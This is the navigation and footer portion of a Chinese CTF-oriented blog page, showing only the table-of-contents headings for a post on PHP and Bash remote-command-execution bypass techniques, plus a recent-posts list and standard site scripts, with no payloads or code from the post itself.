href="#RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%A7%BF%E5%8A%BF"><span class="toc-text">RCE命令执行的姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">写入一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%AD%E6%A0%87%E7%AD%BE"><span class="toc-text">短标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-text">内联执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-text">无参数RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%A5%97%E7%94%A8"><span class="toc-text">函数套用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8"><span class="toc-text">突破函数禁用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#glob%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"><span class="toc-text">glob伪协议查看文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session%E8%BF%9B%E8%A1%8C%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-text">利用session进行无参数RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E8%BF%9B%E8%A1%8C%E6%97%A0%E5%8F%82%E6%95%B0RE"><span class="toc-text">利用请求头进行无参数RE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%BF%9B%E8%A1%8C%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-text">利用全局变量进行无参数RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8DRCE"><span class="toc-text">无字母RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-bin%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-text">使用&#x2F;bin目录下的可执行程序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bashfuck%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%AD%97%E6%AF%8DRCE"><span class="toc-text">bashfuck实现无字母RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E7%BC%96%E7%A0%81%E6%89%A7%E8%A1%8CRCE"><span class="toc-text">数字编码执行RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-Bash-Shell%E7%9A%84Here-string%E8%AF%AD%E6%B3%95"><span class="toc-text">Linux Bash Shell的Here string语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0%E5%8F%98%E9%87%8F"><span class="toc-text">$0变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-0"><span class="toc-text">构造$0</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/03/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/" title="对于RCE和文件包含的一点总结">对于RCE和文件包含的一点总结</a><time datetime="2025-04-03T11:27:31.000Z" title="发表于 2025-04-03 19:27:31">2025-04-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/03/XYCTF2024%E5%A4%8D%E7%8E%B0/" title="XYCTF2024复现">XYCTF2024复现</a><time datetime="2025-04-03T11:27:19.000Z" title="发表于 2025-04-03 19:27:19">2025-04-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/03/%E5%85%B3%E4%BA%8EPHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/" title="关于PHP的一些小技巧">关于PHP的一些小技巧</a><time datetime="2025-04-03T07:37:51.000Z" title="发表于 2025-04-03 15:37:51">2025-04-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/02/java%E4%BB%8E0%E5%88%B01%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="java从0到1的学习">java从0到1的学习</a><time datetime="2025-04-02T12:48:35.000Z" title="发表于 2025-04-02 20:48:35">2025-04-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/01/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="关于java反序列化的学习">关于java反序列化的学习</a><time datetime="2025-04-01T12:53:52.000Z" title="发表于 2025-04-01 20:53:52">2025-04-01</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/image/8.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By wanTh3flag</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
